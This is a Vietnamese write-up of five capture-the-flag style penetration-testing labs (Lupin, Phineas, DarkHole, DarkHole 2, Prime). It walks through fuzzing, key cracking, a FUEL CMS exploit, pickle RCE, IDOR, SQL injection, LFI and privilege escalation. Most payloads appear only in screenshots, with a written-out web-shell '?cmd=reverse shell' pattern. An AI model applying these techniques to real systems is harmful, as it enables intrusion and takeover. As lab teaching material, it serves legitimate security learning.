# 1. Lupin

### Đầu tiên khi vào mỗi bài lab ta sẽ thực hiện Scan để thu thập thông tin

Scan để lấy địa chỉ IP của máy ảo mà ta đang exploit, ở đây mình dùng tool `arp-scan `:

![image](https://user-images.githubusercontent.com/86275419/224600679-1de6e122-b333-428a-9a84-0e4c113c194d.png)

Địa chỉ IP máy mục tiêu: `192.168.20.46`

Scan nmap để thu thập thông tin máy mục tiêu:

![image](https://user-images.githubusercontent.com/86275419/224601048-0b80b68a-5117-48f9-8686-246ca878f9bb.png)

Server đang mở 2 Port (có thể nhiều hơn): 22 (SSH), 80 (HTTP)

Ta sẽ tập trung exploit vào dịch vụ web để tìm cách RCE hoặc tìm thông tin để bem vào server 

## Exploit Web 

![image](https://user-images.githubusercontent.com/86275419/224601486-b9a3f637-df13-4ad1-ac3e-8bdea1dcd777.png)

Bùm, một trang web không có chức năng gì :))

Theo thói quen thì mình sẽ thực hiện scan subdir trước

Fuzz bằng Dirsearch là đơn giản nhất:

![image](https://user-images.githubusercontent.com/86275419/224601905-2a7b78c7-0913-4b58-8095-ee74aef979d7.png)

Tool quét ra được một số thư mục ẩn, nhưng đáng chú ý nhất là file `robots.txt`

![image](https://user-images.githubusercontent.com/86275419/224602586-26b7c2d9-3424-4319-8b18-42eb5fbc4064.png)

Truy cập `~myfiles`:

![image](https://user-images.githubusercontent.com/86275419/224602114-0849c585-4a8d-43ca-bcbb-34a3d2f9de76.png)

Truy cập vào thì trang web hiện `Error 404`, nhưng cách hiển thị này lạ lắm :)). Ta sẽ view source code để xem có gì

![image](https://user-images.githubusercontent.com/86275419/224602352-e2e28e36-488a-437f-92c3-e6a348f53e11.png)

Bùm, chỉ có một lời động viên chứ không có thông tin gì khác

Sau một hồi truy cập các thư mục ẩn thì mình không thu được thông tin gì, bây giờ mình sẽ thực hiện Fuzz lần nữa

![image](https://user-images.githubusercontent.com/86275419/224602996-c1ef0c97-bb0a-476c-8003-1f6687080844.png)

Sau 7749 lần đổi wordlist thì mình vẫn không thu được gì, sau một hồi xem lại mình mới phát hiện ra trick ở bài này là thêm ký tự `~` đằng trước tên file mà tác giả đã gợi ý khi ta truy câp vào `~myfile`

Thực hiện Fuzz lại, nhưng lần này ta sẽ thêm dấu `~`:

![image](https://user-images.githubusercontent.com/86275419/224603525-d48f9788-bc21-469c-b009-8971c638cb2d.png)

Sau khi Fuzz lại, ta thấy có một subdir `~secret`

Ta sẽ thử truy cập

![image](https://user-images.githubusercontent.com/86275419/224603765-8f1eda7f-388e-4d73-a636-82de64c8b2b1.png)

Sau khi đọc nội dung ta thấy rằng cần tìm file private key để có thể SSH vào server

Thực hiện Fuzz để tìm file

![image](https://user-images.githubusercontent.com/86275419/224604426-c9bbcbda-e118-4abf-a4fa-e4e63da75275.png)

![image](https://user-images.githubusercontent.com/86275419/224604568-ad406672-ee67-4f17-8cef-218528659ba9.png)

![image](https://user-images.githubusercontent.com/86275419/224605578-8af02cca-c072-4612-b056-715d95474398.png)
... 

Sau 7749 lần đổi wordlist thì mình cũng méo thu đươc gì, cay :triumph: 

Đến đoạn này mình đang bị stuck, sau đó mình mới biết rằng trước tên file cần thêm dấu `.`

Thực hiện Fuzz lại:

![image](https://user-images.githubusercontent.com/86275419/224605992-61913af4-061e-4825-90b9-491b146a087e.png)

Bùm, một loạt file được tìm thấy, nhưng ta sẽ tập trung vào `.mysecret.txt`

![image](https://user-images.githubusercontent.com/86275419/224606193-8231d486-43c4-45b7-b3fa-4e245996417e.png)

Truy cập file

![image](https://user-images.githubusercontent.com/86275419/224606416-4da0e15f-4dc9-4e3c-bda6-a6bb9356478c.png)

Ta nhận được thông điệp đang bị mã hóa, việc của mình bây giờ là cần giải mã thông điệp này

Mình sẽ sử dụng [dcode.fr](https://www.dcode.fr/cipher-identifier) để xác định loại mã hóa

![image](https://user-images.githubusercontent.com/86275419/224606680-f9f20a11-97cb-4b0c-97af-61d26a78004e.png)

Ta thấy rằng loại mã hóa này được xác định khả năng cao là base58

Decrypt ta thu được SSH Private key:

![image](https://user-images.githubusercontent.com/86275419/224606995-bab8ecf5-1d97-4f30-ba8e-1516c6ec2a07.png)

Lúc nãy khi truy cập vào `~myfiles` thì tác giả có gợi ý là crack passfrase bằng wordlist `fasttrack` nên mình dùng luôn khỏi suy nghĩ

Đầu tiên mình tạo 1 file để chứa private key và đặt tên là id_rsa

![image](https://user-images.githubusercontent.com/86275419/224611088-811fdb8c-66a5-4dc1-b484-f2311160ecf4.png)

Tiếp theo mình chuyển định dạng private key về dạng tool john có thể crack bằng tool ssh2john:

![image](https://user-images.githubusercontent.com/86275419/224611297-74620fe9-5a43-462d-9b08-d73aeecafde5.png)

Ta crack được passfrase: `P@55w0rd!`

Username khi ở `~secret` ta cũng có thể đoán được là `icex64`

## Bây giờ ta sẽ ssh vào server

### Note: muốn sử dụng private key để ssh thì ta phải set quyền file chứa private key bắt buộc là 600

![image](https://user-images.githubusercontent.com/86275419/224612003-b447f3f2-20a1-4a49-86ec-33fd22bc8406.png)

![image](https://user-images.githubusercontent.com/86275419/224612044-fd556f53-ebf5-4d32-b653-e404a20a7f91.png)

## Tiếp theo ta sẽ phải leo lên quyền root

Theo thói quen khi mình vào server thì sẽ thử lệnh `sudo -l` đầu tiên

![image](https://user-images.githubusercontent.com/86275419/224612452-608c94ea-c76b-42aa-b846-633ff6acdbb5.png)

Ngon, có manh mối để ta leo quyền cao hơn rồi. Ý nghĩa của câu lệnh sẽ là: ta sẽ có thể chạy file `/home/arsene/heist.py` bằng `/usr/bin/python3.9` với quyền user  `arsene` mà không cần password khi sudo

Bây giờ ta sẽ xem file `/home/arsene/heist.py` có gì để ta ngịch không

Trước hết ta sẽ xem quyền của file, nếu file này mình mà ghi được thì sẽ rất đơn giản để lên quyền user `arsene`

![image](https://user-images.githubusercontent.com/86275419/224613985-40c2c85c-4de3-4782-980b-cc9d408743e6.png)

Vậy là mình không có quyền ghi vào file này. Giờ mình sẽ xem file này có gì

![image](https://user-images.githubusercontent.com/86275419/224614100-a8be18ac-1fc6-4b2c-a8e1-1624f328e028.png)

Khi đọc code xong mình nghĩ ngay đến vector import thư viện. Mình sẽ kiểm tra xem thứ tự ưu tiên import thư viện của chương trình bằng lệnh `python3 -c 'import sys; print("\n".join(sys.path))'`

![image](https://user-images.githubusercontent.com/86275419/224614422-7ef84b4e-df67-451d-bbe9-17adf9a38f82.png)

Ta sẽ tìm thư viện `webbrowser` trong `/usr/lib/python3.9` để xem có thể sửa được nó không

![image](https://user-images.githubusercontent.com/86275419/224614857-d98dffe0-1997-49c7-b0b6-cf211d63acc8.png)

![image](https://user-images.githubusercontent.com/86275419/224614912-6fea0fed-f5c1-4dd9-8dbd-5dc7065e1d2a.png)

Ngon, file này cho ta full quyền luôn, giờ ta chỉ cần vào sửa chút là sẽ lấy được quyền cao hơn

![image](https://user-images.githubusercontent.com/86275419/224615266-2dc389dc-9042-43de-b414-a25fec5ee7e6.png)

Chạy lệnh trong sudo -l

![image](https://user-images.githubusercontent.com/86275419/224615732-25d1aa16-78a1-4b0e-bafc-7b9e1a7ac18e.png)

Bùm, ta đã lên user arsene

## Bây giờ từ arsene ta sẽ tìm đường lên root

Đầu tiền cứ là `sudo -l`

![image](https://user-images.githubusercontent.com/86275419/224616109-b9c45ff2-8830-47dd-b6ab-4c0cc021fbd2.png)

Ta có thể chạy `pip` dưới quyền root mà không cần password

Bây giờ ta sẽ lên [gtfo](https://gtfobins.github.io/) tìm payload exploit rồi lên root thôi 

![image](https://user-images.githubusercontent.com/86275419/224616340-e5cb75e2-42d4-4c3d-82e4-a854827f2926.png)

Ta có thể chạy lệnh bằng sudo nên sẽ dùng payload này

![image](https://user-images.githubusercontent.com/86275419/224616386-5e06e707-5dab-4b5f-9f5d-f2b52a80e2f0.png)

![image](https://user-images.githubusercontent.com/86275419/224616547-0353c921-020b-43d3-867a-ab8c19d0c0f9.png)

Bùm, lên root thành công 

# 2. Phineas

## Scan

Scan tìm IP:

![image](https://user-images.githubusercontent.com/86275419/224674186-5e43440e-d2a9-432b-8326-b3eaafad6840.png)

IP Server: `192.168.44.117`

Scan thu thập thông tin Server:

![image](https://user-images.githubusercontent.com/86275419/224675545-a0310cdc-34ca-4ac4-b450-690cb3576f7d.png)

Kết quả Scan cho thấy server đang mở 4 port: 22 (SSH), 80 (HTTP), 111 (RPC), 3306 (mysql)

Ta sẽ tập trung exploit vào port 80 (http) vì nó có khả năng dính lỗi nhiều nhất

## Exploit Web

![image](https://user-images.githubusercontent.com/86275419/224677353-bd177546-6f79-4468-973a-880be4a56633.png)

Thực hiện Fuzz subdir:

![image](https://user-images.githubusercontent.com/86275419/224678745-2e037a6d-79f4-4ec1-a0ac-d6915ba85c44.png)

Dùng dirsearch thì mình quét được file đáng chú ý nhất là `cgi-bin` thường có thể dính `ShellShock`, tiếp tục quét subdir của cgi-bin

![image](https://user-images.githubusercontent.com/86275419/224679638-73e48cb1-4f77-436b-8998-53fc6e17b200.png)

![image](https://user-images.githubusercontent.com/86275419/224679692-5772f097-d2ec-4409-a91f-41e191ea1b80.png)

Quét 2 lần như trên mình không thu được gì nên mình sẽ Fuzz lại từ thư mục chính 

![image](https://user-images.githubusercontent.com/86275419/224680141-c77185a3-e685-4182-a5a1-0f86673bae32.png)

Lần này mình quét được subdir `structure`

![image](https://user-images.githubusercontent.com/86275419/224680196-e0cbb41c-319f-4730-ae11-3b628aecf3da.png)

Truy cập vào `structure`

![image](https://user-images.githubusercontent.com/86275419/224680694-1e87ed4d-97dc-4c32-a86a-ef4010bded10.png)

Trang web không có chức năng gì, view source code cũng không có manh mối gì nên mình sẽ thử Fuzz tiếp

![image](https://user-images.githubusercontent.com/86275419/224682504-770e2e4e-ef59-40a9-8088-d622153417ad.png)

Kết quả

![image](https://user-images.githubusercontent.com/86275419/224682666-4f60d270-a5af-4623-828e-25e79500e62f.png)

Trong đống này thì chỉ có robots.txt là có giá trị

![image](https://user-images.githubusercontent.com/86275419/224684648-a25d0469-9465-4b86-b19f-3e0ac31ea35e.png)

Truy cập `fuel`

![image](https://user-images.githubusercontent.com/86275419/224684751-ec6f9460-324b-42dd-b2ba-f8199367a342.png)

hmm, not found

Ta sẽ thêm index.php vào trước fuel

![image](https://user-images.githubusercontent.com/86275419/224686205-e452eacc-5076-45ac-9bd0-ba4b28ec0b66.png)

Ta vào được trang login của một CMS. Trong số những lab mình đã làm mà gặp mấy cái CMS như này thì 100% dính CVE

Ta sẽ đi tìm phiên bản của CMS rồi lên mạng search PoC exploit thôi 

![image](https://user-images.githubusercontent.com/86275419/224687646-88d8b91a-086f-418c-b1b4-484e9fc3a8b7.png)

FUEL 1.4

Có [PoC](https://www.exploit-db.com/exploits/50477) giờ ta chỉ cần tải về chạy lấy shell thôi

![image](https://user-images.githubusercontent.com/86275419/224690040-75a94ca1-03df-4059-9105-1fab5ce26d1d.png)

![image](https://user-images.githubusercontent.com/86275419/224690861-123c626c-534a-4af2-afe0-03efee9104f1.png)

Ok, exploit thành công, giờ ta lấy reverse shell về thôi 

## Priv

Tạo reverse shell nhanh chóng tại [đây](https://www.revshells.com/)

Trên máy mình mở một port để lấy shell

![image](https://user-images.githubusercontent.com/86275419/224693848-7932f5dd-d3f0-4ec0-874a-467cf8ff42d9.png)

Trên shell của PoC ta chạy revere shell đã tạo bên trên

![image](https://user-images.githubusercontent.com/86275419/224692164-00dc00af-3027-40f5-82f7-6ae42fb23b54.png)

![image](https://user-images.githubusercontent.com/86275419/224693810-38289c4b-8174-40a9-9674-c1407d670f3e.png)

Lấy reverse shell về thành công

Shell khi lấy về chưa tty nên mình sẽ lên tty trước

![image](https://user-images.githubusercontent.com/86275419/224694069-d06ce41c-714f-47d4-a586-4b2409506590.png)

Vậy là không lên tty được, đồng nghĩa với việc mình không sudo được -> không `sudo -l`

Nêu không sudo được thì mình sẽ đi tìm manh mối trong server

Đầu tiên xem có file nào trong crontab có thể nghịch vào không 

![image](https://user-images.githubusercontent.com/86275419/224694952-d461b747-b067-4f1f-9a70-67e9b5232f87.png)

Rồi xong, không cho đọc luôn

Tiếp theo mình sẽ vào source code của web để xem có thông tin gì có thể sử dụng không

Sau một hồi đọc một đống file thì mình tìm được một dữ liệu đáng chú ý

![image](https://user-images.githubusercontent.com/86275419/224696046-189b3e3d-42b6-4568-b45f-d8d05da4c066.png)

Với thông tin này thì mình có thể log vào mysql, hoặc có thể là hint để ssh vào user `anna`

Mình đã thử log mysql nhưng không được, vậy thì chỉ có thể là trường hợp còn lại

![image](https://user-images.githubusercontent.com/86275419/224696898-2e4686a9-42c6-45dd-a23f-7c9bc9a66c72.png)

Đúng luôn, ta đã ssh được vào user `anna`

![image](https://user-images.githubusercontent.com/86275419/224697348-06fe3368-47c4-4b29-b3b6-6a3ed9d359ed.png)

Bây giờ ta cần exploit để lên quyên cao hơn

Trước hết cứ `sudo -l`

![image](https://user-images.githubusercontent.com/86275419/224697630-344b7ebb-948b-4664-95a0-08ff61d4c9d9.png)

-> Không sử dụng được cách này

Sau một hồi thử các cách hay làm thì mình không thu được gì nên mình sẽ chạy `linpeas` để tìm thêm manh mối 

![image](https://user-images.githubusercontent.com/86275419/224700866-02e63e3b-7842-4a71-a020-33d2b6310e99.png)

Sau khi chạy xong mình mới phát hiện ra đã bỏ qua directory `web` trong thư mục chính của user anna

Thử vào xem có gì có thể khai thác không

![image](https://user-images.githubusercontent.com/86275419/224701522-7765dbb5-9f9a-4163-b1da-231575ee377b.png)

file app.py

![image](https://user-images.githubusercontent.com/86275419/224702363-dca8a56f-68d7-40a3-801d-4bbbbece631d.png)

Sau khi đọc source thì mình hiểu nôm na là ứng dụng sẽ gửi dữ liệu mình truyền vào bằng `post` method tới `/heaven` để xử lý nhưng mình không biết chức năng của `pickle` là gì nên đã lên mạng xem thử và biết được rằng đây là module serialization trong python. Mà serialization thì có khả năng đựa vào đây để khai thác là rất cao 

Và mình tìm được bài viết [này](https://github.com/CalfCrusher/Python-Pickle-RCE-Exploit)

Process khả năng chạy chương trình dưới quyền root, nên ta chỉ cần chạy được revese shell là sẽ có shell của root

![image](https://user-images.githubusercontent.com/86275419/224705865-e6797dcd-891a-45f7-b676-d75503355b92.png)

Giờ mình sẽ tải PoC bên trên custom lại chạy xem có được không

![image](https://user-images.githubusercontent.com/86275419/224706904-9f2ca67c-1eaa-4841-834b-602d5aae9632.png)

Custom file PoC

![image](https://user-images.githubusercontent.com/86275419/224709069-4d8205f2-1983-467f-8bd6-4098d6ac1145.png)

Mở port nhận reverse shell

![image](https://user-images.githubusercontent.com/86275419/224709395-edd0bd9c-5777-4401-a8a1-799c8556ebc3.png)

Chạy PoC

![image](https://user-images.githubusercontent.com/86275419/224709461-59a4fd93-20e1-4782-bc3d-06115e36eebd.png)

![image](https://user-images.githubusercontent.com/86275419/224709597-79b43c60-517f-48e2-ae50-7d4317f6a4bc.png)

Bùm, lên root thành công

![image](https://user-images.githubusercontent.com/86275419/224709808-6331fedb-138e-4778-a562-add3ab65d209.png)

# 3. DarkHole

## Scan

![image](https://user-images.githubusercontent.com/86275419/224719352-64abc1bd-f464-424d-92ac-56d65ffdbddd.png)

IP: `192.168.44.118`

![image](https://user-images.githubusercontent.com/86275419/224719569-037c779c-e1f4-427a-a51b-317e95647d5e.png)

Server mở 2 port: 22 (SSH), 80 (HTTP)

## Exploit web

![image](https://user-images.githubusercontent.com/86275419/224719886-6762d7fc-bb38-4af8-984a-41958337ff9c.png)

Fuzz subdir

![image](https://user-images.githubusercontent.com/86275419/224720320-99a7b7d0-5f27-4b3c-b47a-3fe2cab94b48.png)

![image](https://user-images.githubusercontent.com/86275419/224720248-567fffbb-cc3c-4b0a-8645-fdc9ceb871fd.png)

Vào `/config`:

![image](https://user-images.githubusercontent.com/86275419/224720696-570c620f-a0e4-4bbe-b3bf-20832e119644.png)

File `.php` nêu ta truy cập ở đây thì nó chỉ thực thi bên phía server mà không trả về source code cho mình đọc

Sau khi truy cập các thư mục khác không được gì thì mình đã register và login thử

![image](https://user-images.githubusercontent.com/86275419/224722654-96064c1e-014e-4476-8591-148ffe375444.png)

![image](https://user-images.githubusercontent.com/86275419/224722719-49369e0c-4eee-4d85-99af-347273407151.png)

Ở đây có parameter id nên khả năng dính idor là rất cao

![image](https://user-images.githubusercontent.com/86275419/224723182-0335a92a-40f9-4803-bb76-d2f1c129a12f.png)

![image](https://user-images.githubusercontent.com/86275419/224723276-bb921db6-84ac-4326-aa62-b2e8c6a9bd33.png)

-> Tồn tại user có id = 1

![image](https://user-images.githubusercontent.com/86275419/224723881-625f96e7-3635-4bd6-bd96-ee513f9fb335.png)

Trang web có chức năng đổi pass nên mình sẽ thử xem có thể exploit được gì không

![image](https://user-images.githubusercontent.com/86275419/224723899-47e81acd-8725-4d3f-82ca-df3c1f929148.png)

Bắt request bằng Burp để xem nó gửi đi những gì

![image](https://user-images.githubusercontent.com/86275419/224725382-0746f168-c27b-44b3-8721-ba8b6835d352.png)

Request sẽ gửi đi password và id bằng post method, vậy thì giờ ta thử thay đổi id ở request xem có thu được gì không

![image](https://user-images.githubusercontent.com/86275419/224725589-a42d9c49-dce2-4587-a0e8-bd856bc35757.png)

Password đã update, giờ ta sẽ thử đoán username và thử login với password `12345` vừa đổi xem có được không

![image](https://user-images.githubusercontent.com/86275419/224726143-4ad7e931-18fe-49cc-9fa5-0324eb3e1146.png)

Username khá dễ đoán là `admin` và mình đã login được vào

Ở trang của `admin` có thêm chức năng upload nên khả năng là ta sẽ có thể upload được file thực thi rồi vào `/upload` chạy. Lý thuyết là như vậy, còn được hay không thì ta thử xem thế nào :))

Mình tạo nhanh một file php với nội dung như sau

![image](https://user-images.githubusercontent.com/86275419/224729827-3daf15a1-861e-4bc1-b870-943c0c559fdc.png)

Thực hiện upload thì thấy rằng bị filter extension.

![image](https://user-images.githubusercontent.com/86275419/224730682-1be5ff4f-41b4-41bc-b691-04d25eff8e6a.png)

Giờ ta sẽ tìm cách bypass

Cứ làm theo [hacktricks](https://book.hacktricks.xyz/pentesting-web/file-upload) từ trên xuống dưới kiểu gì cũng được thôi, mong là thế :)))

![image](https://user-images.githubusercontent.com/86275419/224734426-420f23e2-3a49-409b-aa49-641d8072e3b0.png)

Đây rồi, thử đến `.phtml` thì file có thể thực thi. Giờ ta chỉ cần lấy reverse shell về thôi 

![image](https://user-images.githubusercontent.com/86275419/224735286-8a5cd8e2-f05c-4afc-a63d-64a4f2df4434.png)

Nếu dán thẳng revere shell lên url như này thì chắc chắn sẽ bị lỗi do dính một số ký tự đặc biệt nên mình sẽ encode trước khi đưa vào

![image](https://user-images.githubusercontent.com/86275419/224735661-dd7b72b6-6296-4dc1-b883-23fb1483d077.png)

![image](https://user-images.githubusercontent.com/86275419/224735785-7ad12527-42b2-4255-95a9-1197b8bfd651.png)

Lấy shell thành công

## Priv

Lên tty:

![image](https://user-images.githubusercontent.com/86275419/224736315-08ba479c-4aab-41e7-b7c3-b14e86195828.png)

Những cách thông thường khi vào server thực hiện không thành công thì mình sẽ không đưa vào đây nữa

![image](https://user-images.githubusercontent.com/86275419/224765387-66a8a36f-d81a-4577-b155-8869fc6c4a68.png)

Khi mình exploit đến directory của user `john` thì mình phát hiện ra `.ssh` mình được phép ghi vào do group của thư mục đang là group của mình, nhưng đời không như là mơ, id_rsa không cho ghi vào, nên coi như chả làm được gì với cái này

![image](https://user-images.githubusercontent.com/86275419/224742128-10dc7527-2a28-474e-937a-04fd9cdd6619.png)

Ta chú ý vào file `toto` 

![image](https://user-images.githubusercontent.com/86275419/224765538-d7aa6fa1-b3bb-44b9-acf5-6b1aa4d7a3cd.png)
 
Chạy thử ta thấy rằng nó sẽ thực hiện command id, mấy bài kiểu này thì ta chỉ cần thay đổi PATH để khi chạy command id thì nó sẽ tìm tới file thực thi ở thư mục đầu tiên trong biến PATH

![image](https://user-images.githubusercontent.com/86275419/224744486-e0644bd2-316f-4152-b9fc-8734a7a23ee2.png)

Chuyển sang user `john` thành công, đoạn này theo thói quen mình hay chạy `id` khi vào máy mà quên mất lúc nãy vừa sửa PATH 

Giờ đổi lại PATH như cũ chạy là ok

![image](https://user-images.githubusercontent.com/86275419/224745180-838f8a36-a2c8-4aa2-b468-7fa183d51776.png)

![image](https://user-images.githubusercontent.com/86275419/224745309-ddcd7ac4-8c19-4d8f-946f-7382b154274c.png)

Xem file password là ta sẽ có password của john, sau đó ta sẽ thực hiện lại các bức hay làm khi vào server

![image](https://user-images.githubusercontent.com/86275419/224745648-a1fea50f-df05-403b-b6f7-f209121f58ce.png)

![image](https://user-images.githubusercontent.com/86275419/224745812-9421cfce-f703-4b3e-be27-53a60218e019.png)

Đây rồi, sửa file `file.py` rồi bem thôi

![image](https://user-images.githubusercontent.com/86275419/224746520-a4800903-ff3a-4162-ad08-4f5f8c0ae18c.png)

![image](https://user-images.githubusercontent.com/86275419/224746671-07edede5-2644-4185-8394-cb463ee7254d.png)

Done

![image](https://user-images.githubusercontent.com/86275419/224746958-9e6dc21a-7ad6-4d36-b47e-cdf7d68e37d2.png)

# 4. DarkHole 2

## Scan

![image](https://user-images.githubusercontent.com/86275419/224766620-c3642f55-c117-4e32-928e-1ceae6bd2650.png)

IP: `192.168.44.118`

![image](https://user-images.githubusercontent.com/86275419/224766974-95e415e8-f819-404f-b932-968ffdb1efa5.png)

Bài này số lượng port mở cũng giống bài bên trên. Ta vẫn sẽ tập trung vào web

## Web exploit

![image](https://user-images.githubusercontent.com/86275419/224775310-bf205d76-43d5-4ea7-924c-be61082fc4c4.png)

Fuzz subdir

![image](https://user-images.githubusercontent.com/86275419/224771644-6da4be53-a259-4c4b-8e66-4e606805be08.png)

Fuzz được một đống file git luôn, trước trên picoCTF hình như cũng có một bài về git, nhưng lâu quá chưa gặp lại nên giờ mình gần như không có hiểu biết gì về git luôn :slightly_frowning_face:, giờ phải đi xem một số bài exploit khi có file git 

Đầu tiên ta get đống file git về bằng `git-dumper`

![image](https://user-images.githubusercontent.com/86275419/224777465-22b481c2-2ee7-4e12-a7db-80c10cda9818.png)

Ta được source code của trang web:

![image](https://user-images.githubusercontent.com/86275419/224777541-1b59bf2f-d59b-47cd-b1cb-5c6f897a9ffd.png)

Sau khi đọc hết đống file này thì mình thấy không có gì đáng chú ý, file dashboard.php để đọc được thì mình cần deobfuscate

![image](https://user-images.githubusercontent.com/86275419/224780780-3a845800-c6b2-439e-a8de-5343dbac1bea.png)

Đang stuck thì mình mới nhớ ra nãy tìm hiểu mấy bài exploit họ có xem được log của git 

![image](https://user-images.githubusercontent.com/86275419/224783255-2e092ba6-b115-43ec-ae27-f9b8d426ea83.png)

Đây rồi, ta sẽ xem có gì hay không

![image](https://user-images.githubusercontent.com/86275419/224783387-cf8e1941-dc54-49aa-b89c-567c70e2cd0d.png)

Ta thu được user và pass của account admin

Thực hiện login vào hệ thống

![image](https://user-images.githubusercontent.com/86275419/224783831-7ddc9de7-7398-4947-9f22-deb2f975b28a.png)

![image](https://user-images.githubusercontent.com/86275419/224783894-9c93b10d-f72d-4caf-8c5a-eb67d11f33c5.png)

Nhìn thấy parameter `id` mình lại nghĩ đến idor, nhưng không lẽ hai bài lại một kịch bản giống nhau?

Sau khi test lại + mình có thể đọc source file dashboard.php thì không phải. Trong file dashboard.php thì duy nhất biến $mobile là không bị filter và ta có thể tấn công SQL Injection

Sau một hồi test các kiểu thì mình biết injection được vào trường id, ảo v~~~~~ , đúng là không tin được bố con thằng nào

![image](https://user-images.githubusercontent.com/86275419/224786558-96425680-3bad-4191-a311-5261b2477928.png)

Đến đây thì ta ném vào sqlmap chạy thôi

Đầu tiên ta sẽ tìm tên database

![image](https://user-images.githubusercontent.com/86275419/224789894-6171316c-3272-437f-9c24-0fe1e9a52ef3.png)

Kết quả:

![image](https://user-images.githubusercontent.com/86275419/224789983-530a27e6-33c6-4176-b39a-35738ac5ebb5.png)

Chắc chắn thứ ta cần nằm ở db darkhole_2

Giờ ta sẽ dump dữ liệu trong database này ra

![image](https://user-images.githubusercontent.com/86275419/224790534-0258aa05-5c0b-4003-83b0-20d06930c859.png)

Kết quả 

![image](https://user-images.githubusercontent.com/86275419/224790625-6c558b95-9729-4b74-9966-3667d2cbb494.png)

Ta dump được username và pass của user `jehad` trong bảng ssh

Giờ thì ta ssh vào thôi

![image](https://user-images.githubusercontent.com/86275419/224791621-91b11a3b-a383-4510-b35c-96b0e3b8998a.png)

## Priv

File crontab

![image](https://user-images.githubusercontent.com/86275419/224793611-2c2a4d7e-df61-4d97-aa12-041b0e7a5eaa.png)

Có một trang php đang chạy dưới quyền user losy ở localhost

Ta xem file code có tại /opt/web có gì đáng chú ý không

![image](https://user-images.githubusercontent.com/86275419/224794077-0acad2cf-389e-401c-b47d-04fd43c3f5e6.png)

Đoạn code này sẽ thực thi command khi người dùng nhập vào. Bây giờ ta chỉ cần truy cập được trang này và tạo reverse shell là sẽ có shell của user `losy`.  Trang này đang chạy ở localhost nên ta đơn giản là curl với parameter `?cmd=reverse shell`

![image](https://user-images.githubusercontent.com/86275419/224796024-bdcb6867-532b-4d6e-8689-fd061f177dbd.png)

![image](https://user-images.githubusercontent.com/86275419/224796114-dfbf74df-9dab-477b-a9d1-4373f4cfe8f8.png)

Chuyển sang user `losy` thành công

![image](https://user-images.githubusercontent.com/86275419/224796401-79367b42-3e3c-40ce-b6ac-9797056776fd.png)

Đọc file `.bash_history` ta sẽ thu được pass của user `losy`

![image](https://user-images.githubusercontent.com/86275419/224797349-e86c3820-d305-4590-b62a-aaa430dfeeb2.png)

Có password rồi thì đầu tiên cứ `sudo -l` thôi

![image](https://user-images.githubusercontent.com/86275419/224797486-5e826da5-ccac-41f2-b884-59d4d62bd033.png)

Cho chạy python dưới quyền root thì easy rồi, bài này còn cho chạy command trực tiếp hoặc làm giống như bài trên là bem được root

![image](https://user-images.githubusercontent.com/86275419/224798026-f62b4551-b684-4155-b387-ef6f826e11df.png)

Done!

![image](https://user-images.githubusercontent.com/86275419/224798157-0f67173c-3935-4f87-bdf2-baa94901a514.png)


# 5. Prime

![image](https://user-images.githubusercontent.com/86275419/224801515-296779fe-0cb4-4f55-88ce-df421e33e67d.png)

Chưa kịp làm gì đã có hint tìm password.txt rồi :joy:

## Scan

![image](https://user-images.githubusercontent.com/86275419/224802421-9b157043-7c42-46f0-a4b6-24e8f540cc9f.png)

IP: `192.168.44.118`

![image](https://user-images.githubusercontent.com/86275419/224802545-0afaf090-0236-434d-8f95-0a2811846a99.png)

Server mở 2 port: 22, 80

## Web Exploit

Mọi người chú ý khi làm con lab này, nếu không vào được web là nó đang sập đấy, cú v~l

![image](https://user-images.githubusercontent.com/86275419/224803500-6d6829f0-26d3-4697-a677-3131074a555d.png)

Trang chủ:

![image](https://user-images.githubusercontent.com/86275419/224806026-5a09dd41-1af6-4382-a4f1-fffe3267879a.png)

Fuzz subdir

![image](https://user-images.githubusercontent.com/86275419/224806274-874d668d-7223-41be-bdf7-5800cfc55a00.png)

Sau khi thử vào mấy cái subdir kia không thu được gì thì mình fuzz tiếp thôi

![image](https://user-images.githubusercontent.com/86275419/224809550-6bf11e9b-7e1e-46aa-9fc9-843c0f227c5a.png)

Fuzz được file đáng chú ý: secret.txt

![image](https://user-images.githubusercontent.com/86275419/224809877-e89b6369-9e4c-4bf6-9ec4-60130b7ba11b.png)

Ta nhận được gợi ý là sử dụng WFUZZ

![image](https://user-images.githubusercontent.com/86275419/224810911-467f290e-fb54-4c34-a750-e845b58625b8.png)

Giờ mình thử Fuzz theo mấy command ở trên xem sao 

![image](https://user-images.githubusercontent.com/86275419/224813300-a01a926d-fbc7-4332-8b49-61c82e46a041.png)

Khi fuzz như thế này thì cả những kết quả rác cũng trả về nên ta cần bổ sung thêm 1 option để lọc cho dễ, ở đây mình thấy những kết quả rác sẽ có độ dài 136 ký tự nên mình sẽ thêm `--hh 136` để ẩn những kết quả đó đi

![image](https://user-images.githubusercontent.com/86275419/224813946-37a4dee5-b772-4083-b315-ec0e4cb04d7c.png)

Ok vậy là ta biết rằng có một parameter `file`, giờ truy cập thử xem sao

![image](https://user-images.githubusercontent.com/86275419/224814790-fa51f2f4-fe10-48d2-bccf-ed339642c903.png)

Ta có gợi ý là sử dụng parameter `secrettier360` trên một số trang php khác. Lúc đầu dirsearch thì mình có quét được image.php

![image](https://user-images.githubusercontent.com/86275419/224815469-1539f8ea-9753-4581-858e-eb5f3a1f8768.png)

Mấy dạng bài như này thường có thể LFI nên ta sẽ thử xem sao

![image](https://user-images.githubusercontent.com/86275419/224816447-7cc70736-5b1b-4961-a237-8a586d31ea70.png)

Đúng là có thể LFI được, giờ việc của mình là tìm xem có gì hay ho không

Để ý user saket: `saket:x:1001:1001:find password.txt file in my directory:/home/saket:`

Đọc thử password.txt 

![image](https://user-images.githubusercontent.com/86275419/224817185-3c653918-298f-4d47-93a5-521497e36cb4.png)

Đã có password, giờ ta thử login vào wordpress 

Lúc đọc /etc/passwd thì mình có thể liệt kê được 2 user là: saket và victor

Đầu tiên mình thử `admin:follow_the_ippsec`  -> Fail

Tiếp theo `saket:follow_the_ippsec` -> Fail

Cuối cùng `victor:follow_the_ippsec` -> Success

![image](https://user-images.githubusercontent.com/86275419/224818216-7a210d48-d061-40c8-846f-9aab4ff71885.png)

Khi vào wordpress thì mình cứ ưu tiên vào `Theme Editor` xem có file nào đấm được không

![image](https://user-images.githubusercontent.com/86275419/224820166-6a4e8a0f-6d16-46ee-ae44-970d88da608b.png)

Truy cập vào file để thực thi file `/wordpress/wp-content/themes/twentynineteen/secret.php?cmd=reverse shell`

![image](https://user-images.githubusercontent.com/86275419/224820971-688ee0bc-d982-4f53-becd-ab622babe8e3.png)

